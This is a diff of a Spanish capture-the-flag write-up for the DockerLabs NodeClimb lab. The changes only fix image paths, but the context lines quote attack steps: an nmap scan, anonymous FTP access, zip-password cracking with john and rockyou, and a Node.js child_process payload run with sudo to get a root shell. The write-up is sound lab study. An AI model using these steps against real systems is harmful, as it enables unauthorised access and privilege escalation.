@@ -16,7 +16,7 @@ Escaneo completo con Nmap para detectar puertos abiertos, versiones y scripts po
 sudo nmap -sS -sV -sC -T4 -oA nmap_nodeclimb <IP>
 ```
 
-![Nmap scan](assets/3.png)
+![Nmap scan](DockerLabs/NodeClimb/assets/3.png)
 
 Resultados:
 
@@ -39,7 +39,7 @@ login anonymous
 ls
 ```
 
-![FTP anónimo](assets/1.png)
+![FTP anónimo](DockerLabs/NodeClimb/assets/1.png)
 
 Se descarga el archivo `secretitopicaron.zip`:
 
@@ -58,7 +58,7 @@ zip2john secretitopicaron.zip > hash.txt
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![zip2john y hash](assets/4.png)
+![zip2john y hash](DockerLabs/NodeClimb/assets/4.png)
 
 John encuentra la contraseña. Se descomprime el ZIP:
 ![John](assets/6.png)
@@ -67,7 +67,7 @@ unzip secretitopicaron.zip
 cat password.txt
 ```
 
-![Credenciales](assets/5.png)
+![Credenciales](DockerLabs/NodeClimb/assets/5.png)
 
 El archivo `password.txt` contiene credenciales en texto claro: **usuario y contraseña**.
 
@@ -103,7 +103,7 @@ Se introduce el payload:
 require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
 ```
 
-![Payload node](assets/2.png)
+![Payload node](DockerLabs/NodeClimb/assets/2.png)
 
 Se ejecuta el script con sudo:
 
